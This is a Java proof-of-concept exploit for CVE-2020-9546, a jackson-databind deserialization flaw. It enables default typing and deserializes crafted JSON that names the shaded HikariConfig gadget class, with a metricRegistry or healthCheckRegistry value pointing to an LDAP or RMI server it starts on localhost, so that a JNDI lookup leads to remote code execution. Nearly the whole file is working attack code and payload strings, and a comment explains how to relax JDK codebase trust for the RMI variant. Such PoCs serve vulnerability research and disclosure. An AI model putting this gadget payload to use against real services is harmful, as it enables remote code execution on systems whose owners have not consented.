package com.threedr3am.bug.jackson.rce;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.threedr3am.bug.common.server.LdapServer;
import java.io.IOException;

/**
 *
 * jackson-databind <= 2.9.10.3 and <= 2.10.2 RCE，需要开启DefaultType (reported by threedr3am & LFY)
 *
 * CVE-2020-9546
 *
 * <dependency>
 *       <groupId>org.apache.hadoop</groupId>
 *       <artifactId>hadoop-client-minicluster</artifactId>
 *       <version>3.2.1</version>
 * </dependency>
 *
 * @author threedr3am
 */
public class HadoopHikariConfigPoc {

  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) throws IOException {
    //TODO 使用rmi server模式时，jdk版本高的需要开启URLCodebase trust
//    System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");

    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();

//    String json = "[\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\", {\"metricRegistry\":\"rmi://localhost:43657/Calc\"}]";
    String json = "[\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\", {\"metricRegistry\":\"ldap://localhost:43658/Calc\"}]";
//    String json2 = "[\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\", {\"healthCheckRegistry\":\"rmi://localhost:43657/Calc\"}]";
    String json2 = "[\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\", {\"healthCheckRegistry\":\"ldap://localhost:43658/Calc\"}]";
    mapper.readValue(json, Object.class);
  }
}
